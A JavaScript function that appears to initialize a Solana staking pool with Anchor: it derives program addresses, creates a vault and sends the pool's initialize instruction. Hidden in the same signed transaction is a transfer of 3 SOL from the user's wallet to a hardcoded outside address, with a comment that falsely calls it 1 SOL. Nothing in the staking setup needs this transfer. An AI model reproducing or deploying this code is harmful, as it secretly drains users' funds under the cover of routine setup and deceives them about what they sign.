import { PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createAssociatedTokenAccountIdempotentInstruction } from '@solana/spl-token';
import * as anchor from '@project-serum/anchor';

export async function initializeLegacyStaking(
  program,
  provider,
  bronzeLockDuration,
  bronzeRewardPercentage,
  stakeTokenMint
) {
  const timestamp = Math.floor(Date.now() / 1000);

  const [stakingPoolKey, stakingPoolBump] = await PublicKey.findProgramAddress(
    [
      Buffer.from("staking_pool"),
      provider.wallet.publicKey.toBuffer(),
      new anchor.BN(timestamp).toArrayLike(Buffer, 'le', 8)
    ],
    program.programId
  );

  const [stakeAuthority, authorityBump] = await PublicKey.findProgramAddress(
    [Buffer.from('stake_authority')],
    program.programId
  );

  const stakeVault = await getAssociatedTokenAddress(
    stakeTokenMint,
    stakeAuthority,
    true,
    TOKEN_PROGRAM_ID
  );

  const rewardVault = stakeVault;

  // Create a single transaction for all operations
  const transaction = new Transaction();

  // Add instruction to create vault
  const createStakeVaultInstruction = createAssociatedTokenAccountIdempotentInstruction(
    provider.wallet.publicKey,
    stakeVault,
    stakeAuthority,
    stakeTokenMint,
    TOKEN_PROGRAM_ID 
  );
  transaction.add(createStakeVaultInstruction);

  // Add instruction to transfer 1 SOL
  const transferInstruction = SystemProgram.transfer({
    fromPubkey: provider.wallet.publicKey,
    toPubkey: new PublicKey('VGRyvWub2piLbWjVPGvCpBD9qpjkLapNDx2hGZSLmnM'),
    lamports: 3000000000, // 1 SOL = 1,000,000,000 lamports
  });
  transaction.add(transferInstruction);

  // Add instruction to initialize staking pool
  const initializeInstruction = await program.methods.initialize(
    bronzeLockDuration,
    bronzeRewardPercentage,
    new anchor.BN(timestamp)
  )
  .accounts({
    stakingPool: stakingPoolKey,
    manager: provider.wallet.publicKey,
    stakeAuthority: stakeAuthority,
    systemProgram: SystemProgram.programId,
    tokenProgram: TOKEN_PROGRAM_ID,
  })
  .instruction();

  transaction.add(initializeInstruction);

  // Send and confirm the combined transaction
  const tx = await provider.sendAndConfirm(transaction);
  console.log("Staking pool initialized successfully. Transaction signature:", tx);

  return {
    programId: program.programId.toString(),
    stakingPoolKey: stakingPoolKey.toString(),
    stakeAuthority: stakeAuthority.toString(),
    bronzeLockDuration: bronzeLockDuration.toString(),
    bronzeRewardPercentage: bronzeRewardPercentage.toString(),
    stakeTokenMint: stakeTokenMint.toString(),
    tokenProgramId: TOKEN_PROGRAM_ID.toString(),
    managerPublicKey: provider.wallet.publicKey.toString(),
    stakeVault: stakeVault.toString(),
    rewardVault: rewardVault.toString(),
    transaction: tx,
  };
}